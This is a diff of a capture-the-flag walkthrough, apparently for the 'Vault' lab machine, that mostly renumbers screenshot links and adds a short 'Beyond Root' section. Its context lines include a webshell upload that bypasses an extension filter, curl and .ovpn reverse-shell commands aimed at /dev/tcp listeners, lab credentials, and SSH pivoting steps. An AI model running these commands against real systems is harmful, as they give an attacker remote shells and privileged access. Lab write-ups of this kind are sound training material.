@@ -4,17 +4,17 @@
 
 Nmap scan:
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
 
 ### Sparklays Directories
 
 Port 80 shows this page here.
 
-<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 The hint here is to check the `/sparklays` directory, which returns a 403 error.
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
 
 Since we know this directory exists, what we can do is to use `gobuster` on the `/sparklays` directory to find others. Doing this reveals the `/design` directory.
 
@@ -39,7 +39,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 I also ran a `feroxbuster` scan to leverage on its recursive scans, and found some more directories.
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35) (2).png" alt=""><figcaption></figcaption></figure>
 
 These directories returned nothing, so I did another `gobuster` scan with the `-x` flag to indicate file extensions like .html or .php.
 
@@ -72,11 +72,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 On the `design.html` page, all we see is this:
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>
 
 This brings us to `changelogo.php`, which allows us to upload a file. Only image file are allowed. Obviously, we have to upload a PHP webshell somehow and bypass the file type check. I tried with multiple PHP extensions, and found that `.php5` works.
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
 
 ```
 $ curl http://sparklays.com/sparklays/design/uploads/test1.php5?cmd=id
@@ -89,7 +89,7 @@ Now, we have RCE on the machine and can get a reverse shell. We can use this com
 $ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.21/4444 0>&1"' http://sparklays.com/sparklays/design/uploads/test1.php5
 ```
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -114,7 +114,7 @@ dave
 Dav3therav3123
 ```
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
 
 ### Port Forwarding
 
@@ -137,7 +137,7 @@ ssh -f -N -D 1080 dave@sparklays.com
 
 Then, we can begin to scan both of these machines with `nmap`. Scanning the first 1000 ports, I found that there was indeed a service running on it.
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (36) (5).png" alt=""><figcaption></figcaption></figure>
 
 We can take a look at this using a browser with proxychains configured.&#x20;
 
@@ -145,15 +145,15 @@ We can take a look at this using a browser with proxychains configured.&#x20;
 
 The page reveals a DNS server:
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
 
 The first link doesn't work, but the second brings us to this page where .ovpn files can be uploaded and tested.
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 Googling around for possible exploits reveals that it is possible for us to gain a reverse shell using .ovpn files. First we need to find the local IP Address of the machine, which is 192.168.122.1 when inspecting `ip addr` output.
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
 
 Then, we can input the following file and run Test VPN.&#x20;
 
@@ -167,7 +167,7 @@ up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/4444 0>&1'"
 
 Take note that we have to use the IP address **of the machine** and not our own. With the SSH access we have, we can open a listener port and catch a root shell:
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>
 
 Here, we can grab the user flag from `/home/dave`. Then we can find more credentials for `dave` on this machine:
 
@@ -180,7 +180,7 @@ dav3gerous567
 
 We can then SSH in as `dave` on the DNS server. This helps to upgrade our shell.
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (44) (4).png" alt=""><figcaption></figcaption></figure>
 
 We are allowed to run `sudo` on everything as `dave` within the DNS server, so regaining root permissions is easy.
 
@@ -252,7 +252,7 @@ The solution in this case is to open a random port via `ncat` that would listen 
 
 The logs revealed that this could potentially be an SSH service for `dave`, so I tried just that and it worked! The same credentials for `dave` on the DNS server were used.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (43) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Decrypt Flag
 
@@ -271,6 +271,16 @@ I transferred this to the `ubuntu` machine because it (probably) had the keys im
 
 Then, we can use `gpg -d` to decrypt it.
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
+
+## Beyond Root
+
+I wanted to see if it was possible to get a root shell on the Vault. I transferred LinPEAS to the Vault machine. There was a restricted bash shell that could be escaped using `sh`.
+
+One possible attack vector:
+
+<figure><img src="../../../.gitbook/assets/image (45) (4).png" alt=""><figcaption></figcaption></figure>
+
+However, I could not find any other weaknesses within it. I also couldn't run `pspy64` to view any exploitable crons running. Oh well.
